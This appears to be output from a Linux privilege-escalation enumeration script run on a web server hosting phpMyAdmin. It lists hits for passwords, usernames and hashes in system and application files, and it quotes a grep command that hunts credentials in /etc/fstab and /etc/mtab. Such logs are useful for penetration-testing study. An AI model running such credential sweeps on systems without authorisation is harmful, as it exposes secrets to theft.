+/var/www/html/phpmyadmin/doc/html/themes.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/themes.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/transformations.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/transformations.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/transformations.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/two_factor.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/two_factor.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/two_factor.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/user.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/user.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/user.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/vendors.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/vendors.html:             accesskey="N">next</a> |</li>
+
+[+] Finding possible password in config files
+ /etc/apache2/apache2.conf
+passwd files from being
+ /etc/adduser.conf
+passwd
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+ /etc/reportbug.conf
+password for SMTP
+passwd XXX
+ /etc/nsswitch.conf
+passwd:         compat
+
+[+] Finding 'username' string inside key folders (limit 70)
+/tmp/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+/var/www/html/phpmyadmin/doc/html/_sources/config.txt:      way: username and password are stored in :file:`config.inc.php`.
+/var/www/html/phpmyadmin/doc/html/_sources/faq.txt:``https://example.com/phpmyadmin/?pma_username=user&pma_password=password``.
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt:  back in with the same username (this is not possible with :ref:`auth_http`).
+/var/www/html/phpmyadmin/doc/html/_static/jquery.js:		username: null,
+/var/www/html/phpmyadmin/doc/html/_static/websupport.js:        comment.username = '[deleted]';
+/var/www/html/phpmyadmin/doc/html/_static/websupport.js:      if (opts.moderator || (opts.username == comment.username))
+/var/www/html/phpmyadmin/examples/openid.php:    'https://launchpad.net/~username' => array(
+/var/www/html/phpmyadmin/examples/signon.php:    Username: <input type="text" name="user" /><br />
+/var/www/html/phpmyadmin/js/functions.js:        if ($inputUsername.val() === '') {
+/var/www/html/phpmyadmin/js/server_privileges.js:                'username' : username
+/var/www/html/phpmyadmin/js/server_privileges.js:                'validate_username' : true,
+/var/www/html/phpmyadmin/js/server_privileges.js:        username = $('input[name="username"]');
+/var/www/html/phpmyadmin/js/server_privileges.js:        username = username.val();
+/var/www/html/phpmyadmin/js/server_privileges.js:        var username = $(this).val();
+/var/www/html/phpmyadmin/js/server_privileges.js:    if (username !== null) {
+/var/www/html/phpmyadmin/libraries/check_user_privileges.inc.php:if ($username === '') { // MySQL is started with --skip-grant-tables
+/var/www/html/phpmyadmin/libraries/check_user_privileges.inc.php:list($username, $hostname) = $GLOBALS['dbi']->getCurrentUserAndHost();
+/var/www/html/phpmyadmin/libraries/classes/Database/Designer.php:                . ' WHERE ' . Util::backquote('username') . ' = "'
+/var/www/html/phpmyadmin/libraries/classes/Database/Designer/Common.php:                    . " WHERE username = '"
+/var/www/html/phpmyadmin/libraries/classes/Database/Designer/Common.php:                . " WHERE username = '"
+/var/www/html/phpmyadmin/libraries/classes/Display/Export.php:                 . " WHERE `id` = " . $id  . " AND `username` = '" . $user . "'";
+/var/www/html/phpmyadmin/libraries/classes/Display/Export.php:               . " WHERE `id` = " . $id  . " AND `username` = '" . $user . "'";
+/var/www/html/phpmyadmin/libraries/classes/Display/Export.php:              . " WHERE `id` = " . $id  . " AND `username` = '" . $user . "'";
+/var/www/html/phpmyadmin/libraries/classes/Display/Export.php:           . " WHERE `username` = "
+/var/www/html/phpmyadmin/libraries/classes/IpAllowDeny.php:        $username  = $cfg['Server']['user'];
+/var/www/html/phpmyadmin/libraries/classes/Menu.php:                . $userTable . " WHERE `username` = '"
+/var/www/html/phpmyadmin/libraries/classes/Navigation/Navigation.php:            . " WHERE `username`='"
+/var/www/html/phpmyadmin/libraries/classes/Navigation/Navigation.php:            . " `username`='"
+/var/www/html/phpmyadmin/libraries/classes/Navigation/Nodes/Node.php:                . " WHERE `username`='"
+/var/www/html/phpmyadmin/libraries/classes/Navigation/Nodes/NodeDatabase.php:            . " WHERE `username`='" . $cfgRelation['user'] . "'"
+/var/www/html/phpmyadmin/libraries/classes/RecentFavoriteTable.php:        $username = $GLOBALS['cfg']['Server']['user'];
+/var/www/html/phpmyadmin/libraries/classes/Relation.php:                  WHERE `username` = \'' . $GLOBALS['dbi']->escapeString($username)
+/var/www/html/phpmyadmin/libraries/classes/Relation.php:              WHERE `username` = \'' . $GLOBALS['dbi']->escapeString($username) . '\'
+/var/www/html/phpmyadmin/libraries/classes/Relation.php:            WHERE `username` = \'' . $GLOBALS['dbi']->escapeString($username) . '\'
+/var/www/html/phpmyadmin/libraries/classes/RelationCleanup.php:                . " WHERE `username`  = '" . $GLOBALS['dbi']->escapeString($username)
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:                    $username_length = $v;
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:                && $GLOBALS['pred_username'] == 'any') ? ' selected="selected"' : '')
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:                || $GLOBALS['pred_username'] == 'userdefined')
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:            $GLOBALS['pred_username'] = 'any';
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:            . $username_length . '" title="' . __('User name') . '"'
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:            . '    <select name="pred_username" id="select_pred_username" '
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:            . '<input type="text" name="username" id="pma_username" maxlength="'
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:            . (empty($_REQUEST['username']) ? '' : ' value="'
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:            . (isset($_REQUEST['username']) ? '' : ' selected="selected"')
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:        $_SESSION['replication']['m_username'] = $sr['username']
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:        $username_length = 16;
+/var/www/html/phpmyadmin/libraries/classes/ReplicationGui.php:        if (isset($_REQUEST['username']) && strlen($_REQUEST['username']) === 0) {
+/var/www/html/phpmyadmin/libraries/classes/SavedSearches.php:            . "username = '" . $GLOBALS['dbi']->escapeString($this->getUsername()) . "' "
+/var/www/html/phpmyadmin/libraries/classes/SavedSearches.php:        $this->_username = $username;
+/var/www/html/phpmyadmin/libraries/classes/SavedSearches.php:    private $_username = null;
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                            'username' => $username,
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                        'username' => $username,
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                    $group_assignment[$row['username']] = $row['usergroup'];
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                    . " WHERE `User` = '" . $username . "' AND Host = '"
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                    || $GLOBALS['pred_username'] == 'userdefined'
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                $export_username = mb_substr(
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                $username_length = $val['CHARACTER_MAXIMUM_LENGTH'];
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:                . '`User` = "' . $username . '" AND `Host` = "' . $hostname . '"'
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            $GLOBALS['pred_username'] = 'any';
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            $username = $GLOBALS['username'];
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            $username = $_REQUEST['username'];
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            $username = '';
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            $username, $hostname, (isset($password) ? $password : '')
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            'params'          => array('username' => $username)
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            'username'       => $username,
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            'username' => $username,
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            . ' WHERE `username` = \'' . $username . '\''
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            . ' maxlength="' . $username_length . '" title="' . __('User name') . '"'
+/var/www/html/phpmyadmin/libraries/classes/Server/Privileges.php:            . (isset($GLOBALS['username']) ? '' : ' selected="selected"') . '>'
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/machine-id:db2f18f29d9446cbbfd7ecfdaef4f42a
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5 
+/var/backups/dpkg.status.0: 87fc76f18e98ee7d3848f6b81b3391e5
+/var/www/html/phpmyadmin/doc/html/searchindex.js:"3d06a59ece730eb71b511c17ce752f178259bd92"
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt: 3D06A59ECE730EB71B511C17CE752F178259BD92
+/var/www/html/phpmyadmin/doc/html/setup.html: 3D06A59ECE730EB71B511C17CE752F178259BD92
+/var/www/html/phpmyadmin/composer.lock:"546f5ce1f7778a51182ee46f0356d063"
+/var/www/html/phpmyadmin/yarn.lock:#afdf9488fb1ecefc8348f6fb22f464e32a58b36b"
+/var/www/html/phpmyadmin/vendor/phpseclib/phpseclib/phpseclib/Crypt/Random.php:/7014a0eb6d1611151a286c0ff4f2238f92c120d6/
+/var/www/html/phpmyadmin/vendor/samyoul/u2f-php-server/src/U2FServer.php:'349bca1031f8c82c4ceca38b9cebf1a69df9fb3b94eed99eb3fb9aa3822d26e8'
+/var/www/html/phpmyadmin/vendor/paragonie/random_compat/lib/random_bytes_mcrypt.php:/c568ffe5171d942161fc8dda066bce844bdef676/
+/var/www/html/phpmyadmin/vendor/paragonie/constant_time_encoding/README.md:d558a53e4795aa2ae53e27e4e6c71bcdc4d36cc4f6725a7e664caff551456ac1
+/var/www/html/phpmyadmin/vendor/pragmarx/google2fa/composer.lock:"f0f90c5128c6c9067f83afae918475f4"
+/var/www/html/phpmyadmin/vendor/composer/autoload_static.php:'5255c38a0faeba867671b61dfda6d864'
+/var/www/html/phpmyadmin/vendor/composer/installed.json:"422bf02386ab46f615d1d784b771599357461d73"
+/var/www/html/phpmyadmin/vendor/composer/autoload_files.php:'5255c38a0faeba867671b61dfda6d864'
+  There are more hashes files in the previous parent folder
+/var/www/html/phpmyadmin/tmp/twig/76/7631cb82b2dabe8e8602140152a0bc4133c6ae6ab397b7a34fe6a1ccd98796ab.php:_4d8aa68a53cb3c7daf517695226f06e3fc107f56adbd1062645303c1957a8372 
+/var/www/html/phpmyadmin/tmp/twig/11/114b1cea295395f635906e8d6ba98832c1da8a5112d2fb2447c669ed05526826.php:_1ff03725e59559a2495bed48ccf531a098402b325da94f247be18e1cd7a9ebff 
+/var/www/html/phpmyadmin/tmp/twig/05/05be864ae7c240ba9a13c792c8a51f610abf8451b6b36bf9e7dc68883835e712.php:_2f14b29cba243bd9ac238f7fecc4f20bee38c489310db5a4e5a4c0e95990f363 
+/var/www/html/phpmyadmin/tmp/twig/aa/aa25bde16cc2677137faddce6186e9015160eea07ee217e6c770da2cd7622095.php:_f02a926aae3a4ace9f8f6ba36723d4914733264ada5720fd18008167cea58021 
+/var/www/html/phpmyadmin/tmp/twig/d5/d5c8e383b738456053f74959bb3dcfbb9fc4e43dda68f9e369fb23ea1bf4b68d.php:_e4300051b0f63e7e4379d585ca3aab34b75d0e3b370361af2de654b379d73871 
+/var/www/html/phpmyadmin/tmp/twig/6f/6ff141120d95641ebcf0713cfb85f70af0be412a5ba524e32c4299e05983acc0.php:_1532c5d9fde13ddb882d8a44d6538511bdd7941bce862967b93b0f75e208a8e1 
+/var/www/html/phpmyadmin/tmp/twig/23/23c2d1c6bc0c31fce30223fb58b7d53c20d801119e54c61a10e469deadbefa0f.php:_44eb76d6f8e0e4888a0ee24dc9746c607e81a410781166a00deffb009110c91d 
+/var/www/html/phpmyadmin/tmp/twig/23/23f60e8a5183bf5640272f73003f67349c845ee2b7fec2e438a74bf2e1603c2d.php:_cd5899eb5784aded76675e69294fb50cce575ef5a95c375c620f9efbd67115e0 
+/var/www/html/phpmyadmin/tmp/twig/65/6506b6a4004c45d052863020713df9b8fc0102143c62796957ee63d7f342b7ec.php:_78121d65603b660dcdcf9b6b41378996fc4368249c0d71c344a93d7b4b0a57b5 
+/var/www/html/phpmyadmin/tmp/twig/7b/7b6639daa7f0ef8187ebbf73dd56c25e36d7a104185f18fb3d80daf211b4aa83.php:_c1cb92739cc1e3cf221868bd2127c60557e76e258d42f041668a6b0b15585ed2 
+/var/www/html/phpmyadmin/tmp/twig/56/56649f67309041a04166faea7e84d03224b9d4b3fa5c0e31977e1507c3ba10a6.php:_64f6421ce45ca7e0e67b40fbda42ee05660a11586688ac7f63b072cc8493e80f 
+/var/www/html/phpmyadmin/tmp/twig/56/56a55ad2e462e4c4551d5aa34d8bf1c56eb3e4edf52bd2247be0512ef4ffc427.php:_ec196d4de6da17ebf1cda9bf312158406a38ba8aedf63e7350e2e7fc6af0595c 
+/var/www/html/phpmyadmin/tmp/twig/17/174dbb78adc7e981c755a22749a1083646d0786f4b549c6effbd0311edad7a84.php:_58af8047f5a03a0dac551738f9ef923ec8411ce99446c1d0bc49825fd449147d 
+/var/www/html/phpmyadmin/tmp/twig/66/6666313d2262174a060eb698a4ff0293d0232bd528391806c50c6a9835b6fa11.php:_ffe190dcfb502b3246529709048937924cfb139fee3c19a7143a141ae11405fa 
+/var/www/html/phpmyadmin/tmp/twig/fe/fe455ad3bac7815f330c607ab284693f526ddefaf98aba51af3ffba6220b6e51.php:_bbc5c049a94bca05acdef549488e96b23687672c475f681f4311cd86285f49c9 
+/var/www/html/phpmyadmin/tmp/twig/fe/fea3bf1d6357adecc275fb74ce560d377487f663b5162e61c77a11443194f118.php:_bdb1713400b3289baba14019b396565406ad3b9a18fc3f37a8b6866449fb89dd 
+/var/www/html/phpmyadmin/tmp/twig/ef/efa9f1fd3664fba38634647563672e8e94c6a8ba43e371ca52ace40e205e5f74.php:_f64b51147ca33f837f03f3a38946b4a8b8f21a5178061d3f6855e12e58894537 
+/var/www/html/phpmyadmin/tmp/twig/45/45fa69ee3c3b3fe5cea9c440a10d3c8b85da090e8da2883de6c7b9af7e3ac283.php:_64742a41c4d97aeedc092e560510fea0dd7d96cc0e7d21954a9af74527159be9 
+/var/www/html/phpmyadmin/tmp/twig/fd/fdf1cb105b98ee270bc9837349ae42f316328aeb91b8645840a94183ef8e5ee5.php:_96536183d0dee4f44cbe4d4f8f74851d0e74c23985a7a6c5831a2137a9a64d71 
+/var/www/html/phpmyadmin/tmp/twig/9e/9e92ee0e44785b9bc19bb0d5aa8ca68c9f8d3d0a9eaba28e69a8457850884c3e.php:_12d6c7cc42c7d29c69bd13782b2711c36fca6c730ed43c8387650b151493b8ef 
+/var/www/html/phpmyadmin/tmp/twig/9e/9ebc1a85daf83bc2af12c85f02578716cffa6e800d7947473083898ec9f09f35.php:_a798caa1431ef5ca33d584adab87b5568a1b4238974f07b3417772195ea61b85 
+/var/www/html/phpmyadmin/tmp/twig/9e/9ed22ce9c949f42604d644993983f929a537b60cbf0775569f1fe145f078da38.php:_044de182a4dbba7d4855a55ff4a102192f2c6ad848fb95fb5215967845e127f9 
+  There are more hashes files in the previous parent folder
+/var/www/html/phpmyadmin/tmp/twig/68/682bd2ffbdaefb6b0214f21dea26271d3b2ecd3276515e4f65214e40d3c8b9df.php:_37eb3003c90c7e4481d489b64349f6476164a811f0775382b1c3cbcb204ba2b9 
+/var/www/html/phpmyadmin/tmp/twig/02/0224e06e10ec743f26231dd61ffcf52273c1f777682ad521387dfbc00a4578ba.php:_e5f09762884b4adc7b5657def32a40a837c5129efc4b4315752d928df26cf98f 
+/var/www/html/phpmyadmin/tmp/twig/02/02f2315456e3be68bc898cce739f6116def17ba1e7cbe88004057ebaf9a007d9.php:_85693d82b30de72a181782842056b38280ddbf8e4f410192550da699da0f4b57 
+/var/www/html/phpmyadmin/tmp/twig/ba/ba250f7136c31b718722abdb4188c9612d5e446d07b8761100b21684075aaf26.php:_0cf17b90bcbfdecba8c872515c056208d92867ed9ab7e517ff94ecde257f9b09 
+/var/www/html/phpmyadmin/tmp/twig/ba/ba06e7b7f63e3b2859a3e90bf9fb00a6bfbf8d64eb6fa9c3ccbf74f807bd9ac4.php:_6cfa5cd745d1860e20b31cdb9680fdead2bf614d7f0992c644262ecc13b77d1a 
+/var/www/html/phpmyadmin/tmp/twig/e1/e14cfc105ee68f27e5c431188fdac75f2a073140ff89e4237e8277552cbd63ec.php:_3d7cc6e82dfcdbe2a75ea1575eabd8e117e120ca8e3094405b21e1db448fd5c3 
+/var/www/html/phpmyadmin/tmp/twig/74/74246bcde4b849da5de46dc6789514a91cbbcfa05a3ab122be95b4c06e6a9d61.php:_dcebfc0f261a2432f278293a36fcfd232922f85d40f5d713b3fad0df8c62d167 
+/var/www/html/phpmyadmin/tmp/twig/86/8652cddab811fcb433c4163627746afb213a5ec61d304a58ab1de8096865a062.php:_ca5b3dae92f0eee39166b85e60472b617c85e08a9d7f6cfcd44d8c8488cb66ac 
+/var/www/html/phpmyadmin/tmp/twig/48/48537c04ba3c2a25e99a11781287fe32415290fa81829d80b83732ec5007846c.php:_f889dd6eaec23f4d97c797f537a528e00d47d4e28825ccc0fed846c05583f2c0 
+/var/www/html/phpmyadmin/tmp/twig/6a/6a2a2ac06380c5eade4eb4c3a3bf44347280d749ae3a95b72d108e7869dc3f45.php:_1ff8734a3a67cdc3af6dce51acfc7f278c2fcc91bb239bac1374a660ef70aea0 
+
+[+] Finding URIs with user:password@host inside key folders
